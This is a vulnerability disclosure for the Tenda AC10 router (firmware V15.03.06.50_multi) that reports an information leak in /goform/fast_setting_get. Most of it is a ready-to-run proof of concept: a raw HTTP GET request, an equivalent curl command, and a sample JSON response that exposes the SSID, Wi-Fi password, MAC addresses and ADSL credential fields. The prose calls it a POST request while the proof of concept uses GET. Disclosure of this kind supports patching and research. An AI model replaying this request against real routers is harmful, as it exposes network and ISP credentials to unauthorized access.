# IOT-CVE

# Details


An issue was discovered on Tenda AC1200 MV-MIMO Dual Band GB wifi Router (AC-10)  devices with firmware V15.03.06.50_multi. Privilege escalation
vulnerability in /goform/fast_setting_get allows attackers to enumrate and get Routers Default Information (ssid, password, devicemac, defmac, adsluser, adslpassword)  on the system via a crafted post request.


# Poc

GET /goform/fast_setting_get?0.7024619795874003 HTTP/1.1
Host: 192.168.0.1
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: password=mibtgb
Connection: close

Curl;

curl -i -s -k -X $'GET' \
    -H $'Host: 192.168.0.1' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: http://192.168.0.1/index.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: password=mibtgb' -H $'Connection: close' \
    -b $'password=mibtgb' \
    $'http://192.168.0.1/goform/fast_setting_get?0.7024619795874003';



# Response


HTTP/1.1 200 OK
Content-type: text/plain; charset=utf-8
Pragma: no-cache
Cache-Control: no-cache


{"line":0,"wanType":-1,"net":0,"outType":1,"timeout":"0","lanIp":"192.168.0.1","lanMask":"255.255.255.0","adslUser":"","adslPwd":"","ssid":"Tenda_B38C40","wrlPassword":"DEFAULTPASSWORD","country":"US","power":"high","cloneType":"0","mac":"","deviceMac":"RETACTED","defMac":"RETACTED"}


## Acknowledgment

Pankaj Kumar Thakur (@nep_1337_1998) from Nepal
